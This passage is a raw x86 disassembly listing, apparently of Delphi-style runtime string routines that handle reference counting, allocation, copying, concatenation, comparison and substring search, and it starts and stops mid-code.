  4036ef:	41                   	inc    %ecx
  4036f0:	7f 1a                	jg     0x40370c
  4036f2:	50                   	push   %eax
  4036f3:	52                   	push   %edx
  4036f4:	8b 42 fc             	mov    -0x4(%edx),%eax
  4036f7:	e8 5c 00 00 00       	call   0x403758
  4036fc:	89 c2                	mov    %eax,%edx
  4036fe:	58                   	pop    %eax
  4036ff:	52                   	push   %edx
  403700:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403703:	e8 3c f2 ff ff       	call   0x402944
  403708:	5a                   	pop    %edx
  403709:	58                   	pop    %eax
  40370a:	eb 04                	jmp    0x403710
  40370c:	f0 ff 42 f8          	lock incl -0x8(%edx)
  403710:	87 10                	xchg   %edx,(%eax)
  403712:	85 d2                	test   %edx,%edx
  403714:	74 14                	je     0x40372a
  403716:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403719:	49                   	dec    %ecx
  40371a:	7c 0e                	jl     0x40372a
  40371c:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403720:	75 08                	jne    0x40372a
  403722:	8d 42 f8             	lea    -0x8(%edx),%eax
  403725:	e8 36 f1 ff ff       	call   0x402860
  40372a:	c3                   	ret
  40372b:	90                   	nop
  40372c:	85 d2                	test   %edx,%edx
  40372e:	74 0a                	je     0x40373a
  403730:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403733:	41                   	inc    %ecx
  403734:	7e 04                	jle    0x40373a
  403736:	f0 ff 42 f8          	lock incl -0x8(%edx)
  40373a:	87 10                	xchg   %edx,(%eax)
  40373c:	85 d2                	test   %edx,%edx
  40373e:	74 14                	je     0x403754
  403740:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403743:	49                   	dec    %ecx
  403744:	7c 0e                	jl     0x403754
  403746:	f0 ff 4a f8          	lock decl -0x8(%edx)
  40374a:	75 08                	jne    0x403754
  40374c:	8d 42 f8             	lea    -0x8(%edx),%eax
  40374f:	e8 0c f1 ff ff       	call   0x402860
  403754:	c3                   	ret
  403755:	8d 40 00             	lea    0x0(%eax),%eax
  403758:	85 c0                	test   %eax,%eax
  40375a:	7e 24                	jle    0x403780
  40375c:	50                   	push   %eax
  40375d:	83 c0 0a             	add    $0xa,%eax
  403760:	83 e0 fe             	and    $0xfffffffe,%eax
  403763:	50                   	push   %eax
  403764:	e8 c7 f0 ff ff       	call   0x402830
  403769:	5a                   	pop    %edx
  40376a:	66 c7 44 02 fe 00 00 	movw   $0x0,-0x2(%edx,%eax,1)
  403771:	83 c0 08             	add    $0x8,%eax
  403774:	5a                   	pop    %edx
  403775:	89 50 fc             	mov    %edx,-0x4(%eax)
  403778:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  40377f:	c3                   	ret
  403780:	31 c0                	xor    %eax,%eax
  403782:	c3                   	ret
  403783:	90                   	nop
  403784:	53                   	push   %ebx
  403785:	56                   	push   %esi
  403786:	57                   	push   %edi
  403787:	89 c3                	mov    %eax,%ebx
  403789:	89 d6                	mov    %edx,%esi
  40378b:	89 cf                	mov    %ecx,%edi
  40378d:	89 f8                	mov    %edi,%eax
  40378f:	e8 c4 ff ff ff       	call   0x403758
  403794:	89 f9                	mov    %edi,%ecx
  403796:	89 c7                	mov    %eax,%edi
  403798:	85 f6                	test   %esi,%esi
  40379a:	74 09                	je     0x4037a5
  40379c:	89 c2                	mov    %eax,%edx
  40379e:	89 f0                	mov    %esi,%eax
  4037a0:	e8 9f f1 ff ff       	call   0x402944
  4037a5:	89 d8                	mov    %ebx,%eax
  4037a7:	e8 e8 fe ff ff       	call   0x403694
  4037ac:	89 3b                	mov    %edi,(%ebx)
  4037ae:	5f                   	pop    %edi
  4037af:	5e                   	pop    %esi
  4037b0:	5b                   	pop    %ebx
  4037b1:	c3                   	ret
  4037b2:	8b c0                	mov    %eax,%eax
  4037b4:	55                   	push   %ebp
  4037b5:	8b ec                	mov    %esp,%ebp
  4037b7:	6a 00                	push   $0x0
  4037b9:	6a 00                	push   $0x0
  4037bb:	52                   	push   %edx
  4037bc:	50                   	push   %eax
  4037bd:	8b 45 08             	mov    0x8(%ebp),%eax
  4037c0:	50                   	push   %eax
  4037c1:	51                   	push   %ecx
  4037c2:	6a 00                	push   $0x0
  4037c4:	a1 a8 95 42 00       	mov    0x4295a8,%eax
  4037c9:	50                   	push   %eax
  4037ca:	e8 1d d9 ff ff       	call   0x4010ec
  4037cf:	5d                   	pop    %ebp
  4037d0:	c2 04 00             	ret    $0x4
  4037d3:	90                   	nop
  4037d4:	53                   	push   %ebx
  4037d5:	56                   	push   %esi
  4037d6:	57                   	push   %edi
  4037d7:	55                   	push   %ebp
  4037d8:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  4037de:	50                   	push   %eax
  4037df:	83 c4 fc             	add    $0xfffffffc,%esp
  4037e2:	8b f1                	mov    %ecx,%esi
  4037e4:	89 14 24             	mov    %edx,(%esp)
  4037e7:	8b f8                	mov    %eax,%edi
  4037e9:	85 f6                	test   %esi,%esi
  4037eb:	7f 09                	jg     0x4037f6
  4037ed:	8b c7                	mov    %edi,%eax
  4037ef:	e8 a0 fe ff ff       	call   0x403694
  4037f4:	eb 5f                	jmp    0x403855
  4037f6:	8d 6e 01             	lea    0x1(%esi),%ebp
  4037f9:	81 fd ff 07 00 00    	cmp    $0x7ff,%ebp
  4037ff:	7d 28                	jge    0x403829
  403801:	56                   	push   %esi
  403802:	8d 44 24 08          	lea    0x8(%esp),%eax
  403806:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40380a:	ba ff 0f 00 00       	mov    $0xfff,%edx
  40380f:	e8 a0 ff ff ff       	call   0x4037b4
  403814:	8b d8                	mov    %eax,%ebx
  403816:	85 db                	test   %ebx,%ebx
  403818:	7c 0f                	jl     0x403829
  40381a:	8d 54 24 04          	lea    0x4(%esp),%edx
  40381e:	8b c7                	mov    %edi,%eax
  403820:	8b cb                	mov    %ebx,%ecx
  403822:	e8 5d ff ff ff       	call   0x403784
  403827:	eb 2c                	jmp    0x403855
  403829:	8b dd                	mov    %ebp,%ebx
  40382b:	03 db                	add    %ebx,%ebx
  40382d:	8b c7                	mov    %edi,%eax
  40382f:	8b d3                	mov    %ebx,%edx
  403831:	e8 4a 04 00 00       	call   0x403c80
  403836:	56                   	push   %esi
  403837:	8b 07                	mov    (%edi),%eax
  403839:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40383d:	8b d3                	mov    %ebx,%edx
  40383f:	e8 70 ff ff ff       	call   0x4037b4
  403844:	8b d8                	mov    %eax,%ebx
  403846:	85 db                	test   %ebx,%ebx
  403848:	7d 02                	jge    0x40384c
  40384a:	33 db                	xor    %ebx,%ebx
  40384c:	8b c7                	mov    %edi,%eax
  40384e:	8b d3                	mov    %ebx,%edx
  403850:	e8 2b 04 00 00       	call   0x403c80
  403855:	81 c4 04 10 00 00    	add    $0x1004,%esp
  40385b:	5d                   	pop    %ebp
  40385c:	5f                   	pop    %edi
  40385d:	5e                   	pop    %esi
  40385e:	5b                   	pop    %ebx
  40385f:	c3                   	ret
  403860:	52                   	push   %edx
  403861:	89 e2                	mov    %esp,%edx
  403863:	b9 01 00 00 00       	mov    $0x1,%ecx
  403868:	e8 17 ff ff ff       	call   0x403784
  40386d:	5a                   	pop    %edx
  40386e:	c3                   	ret
  40386f:	90                   	nop
  403870:	31 c9                	xor    %ecx,%ecx
  403872:	85 d2                	test   %edx,%edx
  403874:	74 21                	je     0x403897
  403876:	52                   	push   %edx
  403877:	3a 0a                	cmp    (%edx),%cl
  403879:	74 17                	je     0x403892
  40387b:	3a 4a 01             	cmp    0x1(%edx),%cl
  40387e:	74 11                	je     0x403891
  403880:	3a 4a 02             	cmp    0x2(%edx),%cl
  403883:	74 0b                	je     0x403890
  403885:	3a 4a 03             	cmp    0x3(%edx),%cl
  403888:	74 05                	je     0x40388f
  40388a:	83 c2 04             	add    $0x4,%edx
  40388d:	eb e8                	jmp    0x403877
  40388f:	42                   	inc    %edx
  403890:	42                   	inc    %edx
  403891:	42                   	inc    %edx
  403892:	89 d1                	mov    %edx,%ecx
  403894:	5a                   	pop    %edx
  403895:	29 d1                	sub    %edx,%ecx
  403897:	e9 e8 fe ff ff       	jmp    0x403784
  40389c:	c3                   	ret
  40389d:	8d 40 00             	lea    0x0(%eax),%eax
  4038a0:	31 c9                	xor    %ecx,%ecx
  4038a2:	85 d2                	test   %edx,%edx
  4038a4:	74 2d                	je     0x4038d3
  4038a6:	52                   	push   %edx
  4038a7:	66 3b 0a             	cmp    (%edx),%cx
  4038aa:	74 20                	je     0x4038cc
  4038ac:	66 3b 4a 02          	cmp    0x2(%edx),%cx
  4038b0:	74 17                	je     0x4038c9
  4038b2:	66 3b 4a 04          	cmp    0x4(%edx),%cx
  4038b6:	74 0e                	je     0x4038c6
  4038b8:	66 3b 4a 06          	cmp    0x6(%edx),%cx
  4038bc:	74 05                	je     0x4038c3
  4038be:	83 c2 08             	add    $0x8,%edx
  4038c1:	eb e4                	jmp    0x4038a7
  4038c3:	83 c2 02             	add    $0x2,%edx
  4038c6:	83 c2 02             	add    $0x2,%edx
  4038c9:	83 c2 02             	add    $0x2,%edx
  4038cc:	89 d1                	mov    %edx,%ecx
  4038ce:	5a                   	pop    %edx
  4038cf:	29 d1                	sub    %edx,%ecx
  4038d1:	d1 e9                	shr    $1,%ecx
  4038d3:	e9 fc fe ff ff       	jmp    0x4037d4
  4038d8:	c3                   	ret
  4038d9:	8d 40 00             	lea    0x0(%eax),%eax
  4038dc:	57                   	push   %edi
  4038dd:	50                   	push   %eax
  4038de:	51                   	push   %ecx
  4038df:	89 d7                	mov    %edx,%edi
  4038e1:	31 c0                	xor    %eax,%eax
  4038e3:	f2 ae                	repnz scas %es:(%edi),%al
  4038e5:	75 02                	jne    0x4038e9
  4038e7:	f7 d1                	not    %ecx
  4038e9:	58                   	pop    %eax
  4038ea:	01 c1                	add    %eax,%ecx
  4038ec:	58                   	pop    %eax
  4038ed:	5f                   	pop    %edi
  4038ee:	e9 91 fe ff ff       	jmp    0x403784
  4038f3:	c3                   	ret
  4038f4:	85 c0                	test   %eax,%eax
  4038f6:	74 03                	je     0x4038fb
  4038f8:	8b 40 fc             	mov    -0x4(%eax),%eax
  4038fb:	c3                   	ret
  4038fc:	85 d2                	test   %edx,%edx
  4038fe:	74 3f                	je     0x40393f
  403900:	8b 08                	mov    (%eax),%ecx
  403902:	85 c9                	test   %ecx,%ecx
  403904:	0f 84 de fd ff ff    	je     0x4036e8
  40390a:	53                   	push   %ebx
  40390b:	56                   	push   %esi
  40390c:	57                   	push   %edi
  40390d:	89 c3                	mov    %eax,%ebx
  40390f:	89 d6                	mov    %edx,%esi
  403911:	8b 79 fc             	mov    -0x4(%ecx),%edi
  403914:	8b 56 fc             	mov    -0x4(%esi),%edx
  403917:	01 fa                	add    %edi,%edx
  403919:	39 ce                	cmp    %ecx,%esi
  40391b:	74 17                	je     0x403934
  40391d:	e8 5e 03 00 00       	call   0x403c80
  403922:	89 f0                	mov    %esi,%eax
  403924:	8b 4e fc             	mov    -0x4(%esi),%ecx
  403927:	8b 13                	mov    (%ebx),%edx
  403929:	01 fa                	add    %edi,%edx
  40392b:	e8 14 f0 ff ff       	call   0x402944
  403930:	5f                   	pop    %edi
  403931:	5e                   	pop    %esi
  403932:	5b                   	pop    %ebx
  403933:	c3                   	ret
  403934:	e8 47 03 00 00       	call   0x403c80
  403939:	8b 03                	mov    (%ebx),%eax
  40393b:	89 f9                	mov    %edi,%ecx
  40393d:	eb e8                	jmp    0x403927
  40393f:	c3                   	ret
  403940:	85 d2                	test   %edx,%edx
  403942:	74 61                	je     0x4039a5
  403944:	85 c9                	test   %ecx,%ecx
  403946:	0f 84 9c fd ff ff    	je     0x4036e8
  40394c:	3b 10                	cmp    (%eax),%edx
  40394e:	74 5c                	je     0x4039ac
  403950:	3b 08                	cmp    (%eax),%ecx
  403952:	74 0e                	je     0x403962
  403954:	50                   	push   %eax
  403955:	51                   	push   %ecx
  403956:	e8 8d fd ff ff       	call   0x4036e8
  40395b:	5a                   	pop    %edx
  40395c:	58                   	pop    %eax
  40395d:	e9 9a ff ff ff       	jmp    0x4038fc
  403962:	53                   	push   %ebx
  403963:	56                   	push   %esi
  403964:	57                   	push   %edi
  403965:	89 d3                	mov    %edx,%ebx
  403967:	89 ce                	mov    %ecx,%esi
  403969:	50                   	push   %eax
  40396a:	8b 43 fc             	mov    -0x4(%ebx),%eax
  40396d:	03 46 fc             	add    -0x4(%esi),%eax
  403970:	e8 e3 fd ff ff       	call   0x403758
  403975:	89 c7                	mov    %eax,%edi
  403977:	89 c2                	mov    %eax,%edx
  403979:	89 d8                	mov    %ebx,%eax
  40397b:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  40397e:	e8 c1 ef ff ff       	call   0x402944
  403983:	89 fa                	mov    %edi,%edx
  403985:	89 f0                	mov    %esi,%eax
  403987:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40398a:	03 53 fc             	add    -0x4(%ebx),%edx
  40398d:	e8 b2 ef ff ff       	call   0x402944
  403992:	58                   	pop    %eax
  403993:	89 fa                	mov    %edi,%edx
  403995:	85 ff                	test   %edi,%edi
  403997:	74 03                	je     0x40399c
  403999:	ff 4f f8             	decl   -0x8(%edi)
  40399c:	e8 47 fd ff ff       	call   0x4036e8
  4039a1:	5f                   	pop    %edi
  4039a2:	5e                   	pop    %esi
  4039a3:	5b                   	pop    %ebx
  4039a4:	c3                   	ret
  4039a5:	89 ca                	mov    %ecx,%edx
  4039a7:	e9 3c fd ff ff       	jmp    0x4036e8
  4039ac:	89 ca                	mov    %ecx,%edx
  4039ae:	e9 49 ff ff ff       	jmp    0x4038fc
  4039b3:	c3                   	ret
  4039b4:	53                   	push   %ebx
  4039b5:	56                   	push   %esi
  4039b6:	57                   	push   %edi
  4039b7:	52                   	push   %edx
  4039b8:	50                   	push   %eax
  4039b9:	89 d3                	mov    %edx,%ebx
  4039bb:	31 ff                	xor    %edi,%edi
  4039bd:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  4039c1:	85 c9                	test   %ecx,%ecx
  4039c3:	74 0c                	je     0x4039d1
  4039c5:	39 08                	cmp    %ecx,(%eax)
  4039c7:	75 08                	jne    0x4039d1
  4039c9:	89 cf                	mov    %ecx,%edi
  4039cb:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4039ce:	4a                   	dec    %edx
  4039cf:	eb 02                	jmp    0x4039d3
  4039d1:	31 c0                	xor    %eax,%eax
  4039d3:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  4039d7:	85 c9                	test   %ecx,%ecx
  4039d9:	74 09                	je     0x4039e4
  4039db:	03 41 fc             	add    -0x4(%ecx),%eax
  4039de:	39 cf                	cmp    %ecx,%edi
  4039e0:	75 02                	jne    0x4039e4
  4039e2:	31 ff                	xor    %edi,%edi
  4039e4:	4a                   	dec    %edx
  4039e5:	75 ec                	jne    0x4039d3
  4039e7:	85 ff                	test   %edi,%edi
  4039e9:	74 17                	je     0x403a02
  4039eb:	89 c2                	mov    %eax,%edx
  4039ed:	8b 04 24             	mov    (%esp),%eax
  4039f0:	8b 77 fc             	mov    -0x4(%edi),%esi
  4039f3:	e8 88 02 00 00       	call   0x403c80
  4039f8:	8b 3c 24             	mov    (%esp),%edi
  4039fb:	ff 37                	push   (%edi)
  4039fd:	03 37                	add    (%edi),%esi
  4039ff:	4b                   	dec    %ebx
  403a00:	eb 08                	jmp    0x403a0a
  403a02:	e8 51 fd ff ff       	call   0x403758
  403a07:	50                   	push   %eax
  403a08:	89 c6                	mov    %eax,%esi
  403a0a:	8b 44 9c 18          	mov    0x18(%esp,%ebx,4),%eax
  403a0e:	89 f2                	mov    %esi,%edx
  403a10:	85 c0                	test   %eax,%eax
  403a12:	74 0a                	je     0x403a1e
  403a14:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403a17:	01 ce                	add    %ecx,%esi
  403a19:	e8 26 ef ff ff       	call   0x402944
  403a1e:	4b                   	dec    %ebx
  403a1f:	75 e9                	jne    0x403a0a
  403a21:	5a                   	pop    %edx
  403a22:	58                   	pop    %eax
  403a23:	85 ff                	test   %edi,%edi
  403a25:	75 0c                	jne    0x403a33
  403a27:	85 d2                	test   %edx,%edx
  403a29:	74 03                	je     0x403a2e
  403a2b:	ff 4a f8             	decl   -0x8(%edx)
  403a2e:	e8 b5 fc ff ff       	call   0x4036e8
  403a33:	5a                   	pop    %edx
  403a34:	5f                   	pop    %edi
  403a35:	5e                   	pop    %esi
  403a36:	5b                   	pop    %ebx
  403a37:	58                   	pop    %eax
  403a38:	8d 24 94             	lea    (%esp,%edx,4),%esp
  403a3b:	ff e0                	jmp    *%eax
  403a3d:	c3                   	ret
  403a3e:	8b c0                	mov    %eax,%eax
  403a40:	53                   	push   %ebx
  403a41:	56                   	push   %esi
  403a42:	57                   	push   %edi
  403a43:	89 c6                	mov    %eax,%esi
  403a45:	89 d7                	mov    %edx,%edi
  403a47:	39 d0                	cmp    %edx,%eax
  403a49:	0f 84 8f 00 00 00    	je     0x403ade
  403a4f:	85 f6                	test   %esi,%esi
  403a51:	74 68                	je     0x403abb
  403a53:	85 ff                	test   %edi,%edi
  403a55:	74 6b                	je     0x403ac2
  403a57:	8b 46 fc             	mov    -0x4(%esi),%eax
  403a5a:	8b 57 fc             	mov    -0x4(%edi),%edx
  403a5d:	29 d0                	sub    %edx,%eax
  403a5f:	77 02                	ja     0x403a63
  403a61:	01 c2                	add    %eax,%edx
  403a63:	52                   	push   %edx
  403a64:	c1 ea 02             	shr    $0x2,%edx
  403a67:	74 26                	je     0x403a8f
  403a69:	8b 0e                	mov    (%esi),%ecx
  403a6b:	8b 1f                	mov    (%edi),%ebx
  403a6d:	39 d9                	cmp    %ebx,%ecx
  403a6f:	75 58                	jne    0x403ac9
  403a71:	4a                   	dec    %edx
  403a72:	74 15                	je     0x403a89
  403a74:	8b 4e 04             	mov    0x4(%esi),%ecx
  403a77:	8b 5f 04             	mov    0x4(%edi),%ebx
  403a7a:	39 d9                	cmp    %ebx,%ecx
  403a7c:	75 4b                	jne    0x403ac9
  403a7e:	83 c6 08             	add    $0x8,%esi
  403a81:	83 c7 08             	add    $0x8,%edi
  403a84:	4a                   	dec    %edx
  403a85:	75 e2                	jne    0x403a69
  403a87:	eb 06                	jmp    0x403a8f
  403a89:	83 c6 04             	add    $0x4,%esi
  403a8c:	83 c7 04             	add    $0x4,%edi
  403a8f:	5a                   	pop    %edx
  403a90:	83 e2 03             	and    $0x3,%edx
  403a93:	74 22                	je     0x403ab7
  403a95:	8b 0e                	mov    (%esi),%ecx
  403a97:	8b 1f                	mov    (%edi),%ebx
  403a99:	38 d9                	cmp    %bl,%cl
  403a9b:	75 41                	jne    0x403ade
  403a9d:	4a                   	dec    %edx
  403a9e:	74 17                	je     0x403ab7
  403aa0:	38 fd                	cmp    %bh,%ch
  403aa2:	75 3a                	jne    0x403ade
  403aa4:	4a                   	dec    %edx
  403aa5:	74 10                	je     0x403ab7
  403aa7:	81 e3 00 00 ff 00    	and    $0xff0000,%ebx
  403aad:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  403ab3:	39 d9                	cmp    %ebx,%ecx
  403ab5:	75 27                	jne    0x403ade
  403ab7:	01 c0                	add    %eax,%eax
  403ab9:	eb 23                	jmp    0x403ade
  403abb:	8b 57 fc             	mov    -0x4(%edi),%edx
  403abe:	29 d0                	sub    %edx,%eax
  403ac0:	eb 1c                	jmp    0x403ade
  403ac2:	8b 46 fc             	mov    -0x4(%esi),%eax
  403ac5:	29 d0                	sub    %edx,%eax
  403ac7:	eb 15                	jmp    0x403ade
  403ac9:	5a                   	pop    %edx
  403aca:	38 d9                	cmp    %bl,%cl
  403acc:	75 10                	jne    0x403ade
  403ace:	38 fd                	cmp    %bh,%ch
  403ad0:	75 0c                	jne    0x403ade
  403ad2:	c1 e9 10             	shr    $0x10,%ecx
  403ad5:	c1 eb 10             	shr    $0x10,%ebx
  403ad8:	38 d9                	cmp    %bl,%cl
  403ada:	75 02                	jne    0x403ade
  403adc:	38 fd                	cmp    %bh,%ch
  403ade:	5f                   	pop    %edi
  403adf:	5e                   	pop    %esi
  403ae0:	5b                   	pop    %ebx
  403ae1:	c3                   	ret
  403ae2:	8b c0                	mov    %eax,%eax
  403ae4:	85 c0                	test   %eax,%eax
  403ae6:	74 0a                	je     0x403af2
  403ae8:	8b 50 f8             	mov    -0x8(%eax),%edx
  403aeb:	42                   	inc    %edx
  403aec:	7e 04                	jle    0x403af2
  403aee:	f0 ff 40 f8          	lock incl -0x8(%eax)
  403af2:	c3                   	ret
  403af3:	90                   	nop
  403af4:	85 c0                	test   %eax,%eax
  403af6:	74 02                	je     0x403afa
  403af8:	c3                   	ret
  403af9:	00 b8 f9 3a 40 00    	add    %bh,0x403af9(%eax)
  403aff:	c3                   	ret
  403b00:	8b 10                	mov    (%eax),%edx
  403b02:	85 d2                	test   %edx,%edx
  403b04:	74 38                	je     0x403b3e
  403b06:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403b09:	49                   	dec    %ecx
  403b0a:	74 32                	je     0x403b3e
  403b0c:	53                   	push   %ebx
  403b0d:	89 c3                	mov    %eax,%ebx
  403b0f:	8b 42 fc             	mov    -0x4(%edx),%eax
  403b12:	e8 41 fc ff ff       	call   0x403758
  403b17:	89 c2                	mov    %eax,%edx
  403b19:	8b 03                	mov    (%ebx),%eax
  403b1b:	89 13                	mov    %edx,(%ebx)
  403b1d:	50                   	push   %eax
  403b1e:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403b21:	e8 1e ee ff ff       	call   0x402944
  403b26:	58                   	pop    %eax
  403b27:	8b 48 f8             	mov    -0x8(%eax),%ecx
  403b2a:	49                   	dec    %ecx
  403b2b:	7c 0e                	jl     0x403b3b
  403b2d:	f0 ff 48 f8          	lock decl -0x8(%eax)
  403b31:	75 08                	jne    0x403b3b
  403b33:	8d 40 f8             	lea    -0x8(%eax),%eax
  403b36:	e8 25 ed ff ff       	call   0x402860
  403b3b:	8b 13                	mov    (%ebx),%edx
  403b3d:	5b                   	pop    %ebx
  403b3e:	89 d0                	mov    %edx,%eax
  403b40:	c3                   	ret
  403b41:	8d 40 00             	lea    0x0(%eax),%eax
  403b44:	e9 b7 ff ff ff       	jmp    0x403b00
  403b49:	c3                   	ret
  403b4a:	8b c0                	mov    %eax,%eax
  403b4c:	e9 af ff ff ff       	jmp    0x403b00
  403b51:	c3                   	ret
  403b52:	8b c0                	mov    %eax,%eax
  403b54:	53                   	push   %ebx
  403b55:	85 c0                	test   %eax,%eax
  403b57:	74 2d                	je     0x403b86
  403b59:	8b 58 fc             	mov    -0x4(%eax),%ebx
  403b5c:	85 db                	test   %ebx,%ebx
  403b5e:	74 26                	je     0x403b86
  403b60:	4a                   	dec    %edx
  403b61:	7c 1b                	jl     0x403b7e
  403b63:	39 da                	cmp    %ebx,%edx
  403b65:	7d 1f                	jge    0x403b86
  403b67:	29 d3                	sub    %edx,%ebx
  403b69:	85 c9                	test   %ecx,%ecx
  403b6b:	7c 19                	jl     0x403b86
  403b6d:	39 d9                	cmp    %ebx,%ecx
  403b6f:	7f 11                	jg     0x403b82
  403b71:	01 c2                	add    %eax,%edx
  403b73:	8b 44 24 08          	mov    0x8(%esp),%eax
  403b77:	e8 08 fc ff ff       	call   0x403784
  403b7c:	eb 11                	jmp    0x403b8f
  403b7e:	31 d2                	xor    %edx,%edx
  403b80:	eb e5                	jmp    0x403b67
  403b82:	89 d9                	mov    %ebx,%ecx
  403b84:	eb eb                	jmp    0x403b71
  403b86:	8b 44 24 08          	mov    0x8(%esp),%eax
  403b8a:	e8 05 fb ff ff       	call   0x403694
  403b8f:	5b                   	pop    %ebx
  403b90:	c2 04 00             	ret    $0x4
  403b93:	c3                   	ret
  403b94:	53                   	push   %ebx
  403b95:	56                   	push   %esi
  403b96:	57                   	push   %edi
  403b97:	89 c3                	mov    %eax,%ebx
  403b99:	89 d6                	mov    %edx,%esi
  403b9b:	89 cf                	mov    %ecx,%edi
  403b9d:	e8 a2 ff ff ff       	call   0x403b44
  403ba2:	8b 13                	mov    (%ebx),%edx
  403ba4:	85 d2                	test   %edx,%edx
  403ba6:	74 30                	je     0x403bd8
  403ba8:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403bab:	4e                   	dec    %esi
  403bac:	7c 2a                	jl     0x403bd8
  403bae:	39 ce                	cmp    %ecx,%esi
  403bb0:	7d 26                	jge    0x403bd8
  403bb2:	85 ff                	test   %edi,%edi
  403bb4:	7e 22                	jle    0x403bd8
  403bb6:	29 f1                	sub    %esi,%ecx
  403bb8:	39 cf                	cmp    %ecx,%edi
  403bba:	7e 02                	jle    0x403bbe
  403bbc:	89 cf                	mov    %ecx,%edi
  403bbe:	29 f9                	sub    %edi,%ecx
  403bc0:	01 f2                	add    %esi,%edx
  403bc2:	8d 04 17             	lea    (%edi,%edx,1),%eax
  403bc5:	e8 7a ed ff ff       	call   0x402944
  403bca:	8b 13                	mov    (%ebx),%edx
  403bcc:	89 d8                	mov    %ebx,%eax
  403bce:	8b 52 fc             	mov    -0x4(%edx),%edx
  403bd1:	29 fa                	sub    %edi,%edx
  403bd3:	e8 a8 00 00 00       	call   0x403c80
  403bd8:	5f                   	pop    %edi
  403bd9:	5e                   	pop    %esi
  403bda:	5b                   	pop    %ebx
  403bdb:	c3                   	ret
  403bdc:	85 c0                	test   %eax,%eax
  403bde:	74 56                	je     0x403c36
  403be0:	53                   	push   %ebx
  403be1:	56                   	push   %esi
  403be2:	57                   	push   %edi
  403be3:	55                   	push   %ebp
  403be4:	89 c3                	mov    %eax,%ebx
  403be6:	89 d6                	mov    %edx,%esi
  403be8:	89 cf                	mov    %ecx,%edi
  403bea:	8b 12                	mov    (%edx),%edx
  403bec:	52                   	push   %edx
  403bed:	85 d2                	test   %edx,%edx
  403bef:	74 03                	je     0x403bf4
  403bf1:	8b 52 fc             	mov    -0x4(%edx),%edx
  403bf4:	4f                   	dec    %edi
  403bf5:	7d 02                	jge    0x403bf9
  403bf7:	31 ff                	xor    %edi,%edi
  403bf9:	39 d7                	cmp    %edx,%edi
  403bfb:	7e 02                	jle    0x403bff
  403bfd:	89 d7                	mov    %edx,%edi
  403bff:	8b 6b fc             	mov    -0x4(%ebx),%ebp
  403c02:	89 f0                	mov    %esi,%eax
  403c04:	01 ea                	add    %ebp,%edx
  403c06:	e8 75 00 00 00       	call   0x403c80
  403c0b:	58                   	pop    %eax
  403c0c:	39 d8                	cmp    %ebx,%eax
  403c0e:	75 02                	jne    0x403c12
  403c10:	8b 1e                	mov    (%esi),%ebx
  403c12:	8b 06                	mov    (%esi),%eax
  403c14:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  403c17:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403c1a:	29 d1                	sub    %edx,%ecx
  403c1c:	01 c2                	add    %eax,%edx
  403c1e:	01 f8                	add    %edi,%eax
  403c20:	e8 1f ed ff ff       	call   0x402944
  403c25:	89 d8                	mov    %ebx,%eax
  403c27:	8b 16                	mov    (%esi),%edx
  403c29:	89 e9                	mov    %ebp,%ecx
  403c2b:	01 fa                	add    %edi,%edx
  403c2d:	e8 12 ed ff ff       	call   0x402944
  403c32:	5d                   	pop    %ebp
  403c33:	5f                   	pop    %edi
  403c34:	5e                   	pop    %esi
  403c35:	5b                   	pop    %ebx
  403c36:	c3                   	ret
  403c37:	90                   	nop
  403c38:	85 c0                	test   %eax,%eax
  403c3a:	74 40                	je     0x403c7c
  403c3c:	85 d2                	test   %edx,%edx
  403c3e:	74 31                	je     0x403c71
  403c40:	53                   	push   %ebx
  403c41:	56                   	push   %esi
  403c42:	57                   	push   %edi
  403c43:	89 c6                	mov    %eax,%esi
  403c45:	89 d7                	mov    %edx,%edi
  403c47:	8b 4f fc             	mov    -0x4(%edi),%ecx
  403c4a:	57                   	push   %edi
  403c4b:	8b 56 fc             	mov    -0x4(%esi),%edx
  403c4e:	4a                   	dec    %edx
  403c4f:	78 1b                	js     0x403c6c
  403c51:	8a 06                	mov    (%esi),%al
  403c53:	46                   	inc    %esi
  403c54:	29 d1                	sub    %edx,%ecx
  403c56:	7e 14                	jle    0x403c6c
  403c58:	f2 ae                	repnz scas %es:(%edi),%al
  403c5a:	75 10                	jne    0x403c6c
  403c5c:	89 cb                	mov    %ecx,%ebx
  403c5e:	56                   	push   %esi
  403c5f:	57                   	push   %edi
  403c60:	89 d1                	mov    %edx,%ecx
  403c62:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  403c64:	5f                   	pop    %edi
  403c65:	5e                   	pop    %esi
  403c66:	74 0c                	je     0x403c74
  403c68:	89 d9                	mov    %ebx,%ecx
  403c6a:	eb ec                	jmp    0x403c58
  403c6c:	5a                   	pop    %edx
  403c6d:	31 c0                	xor    %eax,%eax
  403c6f:	eb 08                	jmp    0x403c79
  403c71:	31 c0                	xor    %eax,%eax
  403c73:	c3                   	ret
  403c74:	5a                   	pop    %edx
  403c75:	89 f8                	mov    %edi,%eax
  403c77:	29 d0                	sub    %edx,%eax
  403c79:	5f                   	pop    %edi
  403c7a:	5e                   	pop    %esi
  403c7b:	5b                   	pop    %ebx
  403c7c:	c3                   	ret
  403c7d:	8d 40 00             	lea    0x0(%eax),%eax
  403c80:	53                   	push   %ebx
  403c81:	56                   	push   %esi
  403c82:	57                   	push   %edi
  403c83:	89 c3                	mov    %eax,%ebx
  403c85:	89 d6                	mov    %edx,%esi
  403c87:	31 ff                	xor    %edi,%edi
  403c89:	85 d2                	test   %edx,%edx
  403c8b:	7e 48                	jle    0x403cd5
  403c8d:	8b 03                	mov    (%ebx),%eax
